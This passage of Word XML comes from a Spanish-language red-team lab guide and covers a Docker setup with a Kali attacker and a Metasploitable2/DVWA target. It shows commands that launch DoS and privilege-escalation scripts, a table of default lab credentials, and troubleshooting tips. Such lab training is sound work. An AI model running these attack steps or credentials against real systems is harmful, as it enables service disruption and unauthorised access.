          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-kali bash -c "LAB_TARGET=172.20.0.20 PAUSE_BETWEEN_VECTORS=30 bash /root/scripts/phase-6-dos/run-dos-window.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D6089D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="791547E6" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Fase 7 — Post-explotación</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40742CBA" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 SSH_USER=msfadmin SSH_PASS=msfadmin bash /root/scripts/phase-7-post-exploitation/privesc-check.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E4C43F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A497536" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Detener entorno</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2267AB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>cd C:\Project-Red-Team\docker &amp;&amp; docker compose down</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55EFD6CC" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D103B7B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>IPs y credenciales del laboratorio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7C2578" w14:paraId="17C46714" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="22C6C2B0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Componente</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="3E27AE15" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="134E34CC" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Usuario</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="3A4C2F6E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Contraseña</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="624D83F1" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="64B3351E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Kali (atacante)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4A09AB58" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>172.20.0.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6FFF3AF0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>root</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2D84FF93" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>—</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="4AC7DEC7" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="52CB90B6" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Metasploitable2 (target)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="667B7FFD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>172.20.0.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="2AEA0000" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>msfadmin</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="6E0ED9D6" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>msfadmin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="66C680C2" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="70BA51D4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>DVWA</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="36E2348B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>172.20.0.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1F067C29" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="56D5E532" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>password</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="138886F8" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="68468B42" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>phpMyAdmin</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="75595BAF" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>172.20.0.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="001F3A52" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>root</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2351" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="490D0513" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>(vacía)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="77AE8A84" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578"/>
    <w:p w14:paraId="7E04F385" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Solución de problemas frecuentes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7C2578" w14:paraId="405D245F" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="1EFF220A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Problema</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="3CC9A2B0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Causa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="1E73179A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Solución</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="750CBC76" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5049178B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>redteam-target</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> en Restarting</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1F1910D5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Metasploitable2 tarda en iniciar</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1FA76CFC" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t xml:space="preserve">Esperar 60s, volver a ejecutar </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>docker</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>ps</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="02A3E118" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="04A6EE8F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>ping: connect: Network unreachable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="131AA8D0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Stack no levantado</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="00CAE445" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>docker compose up -d</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> desde </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>docker/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="52AAFB94" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="63FF07C5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>ssh: Connection refused</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="49DA02CB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>Servicio SSH no activo aún</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4BA9F864" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>Esperar 60s más y reintentar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="690AA3DA" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="04824226" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>curl: (7) Failed to connect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="14305611" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Target no alcanzable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="1D628EBD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t xml:space="preserve">Verificar que ambos contenedores están en </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>lab</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>-net</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="2F668348" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="583CCF11" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Permission denied</w:t>
            </w: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en</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> start-pcap.sh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2FE09618" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>tcpdump requiere root</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="55EAE52B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Ejecutar PowerShell como Administrador</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="43FFF39D" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="0AC720C6" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Smoke test falla</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="14410793" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Servicios aún iniciando</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3135" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="1DCC5C5C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Esperar 2 min y repetir</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4D319EBC" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578"/>
    <w:sectPr w:rsidR="007C2578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24985927">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="725488480">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="161092652">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="102115262">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1889800658">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1921788909">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1718502334">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1166939102">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="17932867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A69EB"/>
    <w:rsid w:val="005F4B07"/>
    <w:rsid w:val="007C2578"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D1268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63C2D98E"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{15DC2CA7-C3AC-4DF0-942E-7E73E4D033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1A1A1A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24</Pages>
  <Words>3491</Words>
  <Characters>19204</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>160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22650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217 - GERARDO ANTONIO OVANDO HERNANDEZ</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-01T03:42:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>